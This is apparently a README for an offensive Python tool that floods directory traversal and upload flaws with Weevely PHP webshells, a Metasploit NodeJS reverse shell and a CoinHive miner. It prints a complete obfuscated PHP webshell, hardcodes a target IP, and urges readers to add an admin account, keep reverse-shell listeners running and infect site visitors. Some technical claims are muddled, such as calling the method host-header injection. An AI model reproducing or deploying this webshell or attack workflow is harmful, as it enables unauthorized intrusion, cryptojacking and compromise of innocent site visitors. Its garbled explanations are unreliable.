# Tropical Cumblast - A easy-mode, webshell/reverse-shell and cryptojacking malware spamming cannon

Written in under a day using

1. Python Requests
2. Needs dotdotpwn reports so it has something to parse
3. Preloaded with Weevely PHP Weaponized Webshells, one JavaScript reverse shell provided by Rapid7 and one example CoinHive Cryptominer


All it really does, is spam the living hell out of enumerated file upload vulnerabilities and path permissions issues that should have been taken care of by their administrators.

This is also known as host-header injection.

How it works is...

1. Reads a list of known directory traversal vulns from a wordlist
2. Generates a gigantic list of HTTP GET/POST/PUT requests,
3. Hammers the router with it for half an hour
4. And find out which one of the payloads made it.

You want to be looking at a traversal vulnerablity. that throws a code 302 or lower. That is the only chance we have at getting a stable shell to immediately work with.

Be warned, that it's quite tough. The first thing you should do if you land a shell is immediately get out of the environment, escalate your privileges and add yourself as a new username="admin". This app was specifically designed to launch Weevely PHP payloads, in both it's raw execuable form and as a embedded malware component on webpages.

# Installing and running it.

As long as you have dotdotpwn and some form of a reverse or web shell, then you are already ready to go.

1. Generate a wordlist of scanning results via dotdotpwn. dotdotpwn -m http -h http://ip.addr.ip.v4:80
2. Save the terminal results and change the value of 

list_of_injectable_links = "/root/dumppjbvulns.log"
target = "http://104.27.155.158:80"
payload = "thumbnails.php"

Then you need to generate some payloads. Be sure to take the shellcode and replace the values of these with it...
**raw_nodejs** = """
<html lang="en" dir="ltr">
    <meta charset="utf-8">
    <script type="text/javascript">
 
**html_embedded_payload_buffer** = """
<html lang="en" dir="ltr">
    <meta charset="utf-8">
<script type="text/php">
$M=str_replace('YO','','YOcreYOYOaYOte_YOfunctYOion');
$i=';$e=sto[rpoo[s($s[o[$i],$f);o[if(o[$e){$k=$kh.$ko[f;o[o[oo[b_start();@eo[val(@go[zuncompress(@xo[(@baso[eo[64_decoo[deo[(pre';
$X='[5($i.o[$kh),0,3o[));$o[o[f=o[$sl($ss(md5($io[.$kf),0,o[3));$o[p="";for(o[$o[z=1;$zo[<count($mo[[1]);$o[z++o[)$p.=$q[$mo[[2]';
$x='$kh="o[c016";$o[kf="fo[b54"o[;fo[unction x($t,$ko[){$c=sto[rlo[en($k);$l=o[strleno[($t)o[;$oo[="";o[for($io[=o[0;$i<$l;){foo[r';
$E='[session_starto[();$s=&$o[_o[SESSION;$o[ss="substro[o[";$sl="so[o[trtoloweo[ro[";$i=$m[1][0].$m[1]o[[1o[];$h=$o[sl($ss(mdo';
$t='[$z]o[]o[;if(o[so[trpos($p,$ho[)===0){$s[$i]o[="";$po[=$ss(o[$p,o[3)o[o[;}if(array_key_exio[stso[($i,$s)){o[$so[[$i]o[.=$p';
$I=';$qo[=aro[ro[ay_vao[lues($q);po[reg_matco[h_all("/o[(o[o[[\\w])[\\w-]+(o[?:;q=0.([\\d])o[o[)?,?/"o[,o[$ra,$o[m);if($o[q&&$m){@o';
$z='($j=0;($o[j<$c&&$o[o[i<$l);$j++o[,$i++){$o.=$o[t{$o[i}^$o[k{$j};}}ro[eturn $o[o;}o[$r=$_So[ERo[VER;$ro[r=@$r["HTTP_o[REo[FERE';
$p='Ro["];$ra=@$ro[["HTTo[o[Po[_ACCEPT_LANGUo[AGE"];io[f($rr&&$ra)o[{$u=pao[rseo[_url($rro[);paro[se_str($u[o["qo[uery"]o[,$q)';
$D='o[g_replaco[e(arro[o[ay("/_/","/-/"),array("/o[",o["o[+"),$ss($s[$i]o[,0,$e)))o[o[,$k)));$o=obo[_geto[_co[onteno[ts();ob_en';
$T='d_o[cleao[n();o[$d=bao[seo[64_enco[ode(x(go[zcompress(o[$o),$o[k));printo[("<$o[k>$d<o[/$ko[>");@session_deo[o[stroy();}}}}';
$e=str_replace('o[','',$x.$z.$p.$I.$E.$X.$t.$i.$D.$T);
$b=$M('',$e);$b();
  
 # And remember to select your payload by changing the value of this.
 
**payload_buffer** = html_embedded_payload_buffer


With someone's index.html is in the root web directory, with rwx permissions, then the payload will definitely go off even if its embedded as script tags in the html webpage. If someone loads your website. It goes off. Inside of THEIR webbrowser. And if they were to escape the sandbox of the web browser, then they got a lot to worry about.

# This already is working with...

1. Three working payloads from
      a. A Weevely PHP Penetration Testing Webshell
      b. A embedded PHP of that variant inside of a file called index.htm (it is created when the attack starts) due to the nature of POST requests
      c. A NodeJS Metasploit reverse shell, easily upgradable to Meterpreter.
  
Shell injection vulnerabilities are in fact, disturbingly common. If you own a wordpress, try running this against it to audit it.

# Official Steps

1. Generate a vulnerability report with dotdotpwn
2. Generate your own payloads using Weevely, Metasploit, Pupy, CoinHive, etc.
3. Load all of the obfuscated code into the script urlinjector.py

Point your cannon at whatever unsecured domain you found, and let it rip! Keep your reverse shell listeners running at ALL TIMES. If a web app payload embedded into a webpage snares someone, their reverse shell will be connecting IMMEDIATELY.
